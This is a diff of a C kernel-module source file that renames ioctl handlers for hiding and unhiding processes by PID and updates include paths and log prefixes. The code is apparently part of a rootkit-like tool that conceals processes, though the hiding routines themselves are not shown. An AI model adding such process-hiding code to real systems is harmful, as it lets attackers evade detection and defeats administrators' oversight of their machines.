@@ -17,21 +17,21 @@
  */
 
 #include "logging.h"
-#include "device/details/hash_tbl.h"
-#include "device/details/ioctl_cmd.h"
-#include "proc/proc.h"
+#include "ctrl/details/hash_tbl.h"
+#include "ctrl/details/ioctl_proc.h"
+#include "ctrl/details/pid_utils.h"
 
-int ioc_hide_pid(module_dev_t* p_dev, pid_t pid)
+int ioc_hide_proc(module_dev_t* p_dev, pid_t pid)
 {
     int rc = 0;
 
     if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
-        KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: invalid pid");
+        KLOG_DEBUG(LOG_PREFIX "ctrl::ioc_hide_pid: invalid pid");
         return -ESRCH;  /* No such process */
     }
 
     if (mutex_lock_interruptible(&p_dev->lock)) {
-        KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: failed to lock mutex");
+        KLOG_DEBUG(LOG_PREFIX "ctrl::ioc_hide_pid: failed to lock mutex");
         return -ERESTARTSYS;
     }
     rc = hash_tbl_insert(&p_dev->hash_tbl, pid);
@@ -42,21 +42,21 @@ int ioc_hide_pid(module_dev_t* p_dev, pid_t pid)
         }
     }
     mutex_unlock(&p_dev->lock);
-    KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: hid process result %d", rc);
+    KLOG_DEBUG(LOG_PREFIX "ctrl::ioc_hide_pid: hid process result %d", rc);
     return rc;
 }
 
-int ioc_show_pid(module_dev_t* p_dev, pid_t pid)
+int ioc_show_proc(module_dev_t* p_dev, pid_t pid)
 {
     int rc = 0;
 
     if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
-        KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: invalid pid");
+        KLOG_DEBUG(LOG_PREFIX "ctrl::ioc_show_pid: invalid pid");
         return -ESRCH;  /* No such process */
     }
 
     if (mutex_lock_interruptible(&p_dev->lock)) {
-        KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: failed to lock mutex");
+        KLOG_DEBUG(LOG_PREFIX "ctrl::ioc_show_pid: failed to lock mutex");
         return -ERESTARTSYS;
     }
     rc = hash_tbl_erase(&p_dev->hash_tbl, pid);
@@ -64,7 +64,7 @@ int ioc_show_pid(module_dev_t* p_dev, pid_t pid)
         rc = process_show(pid);
     }
     mutex_unlock(&p_dev->lock);
-    KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: hid process result %d", rc);
+    KLOG_DEBUG(LOG_PREFIX "ctrl::ioc_show_pid: hid process result %d", rc);
     return rc;
 }
 
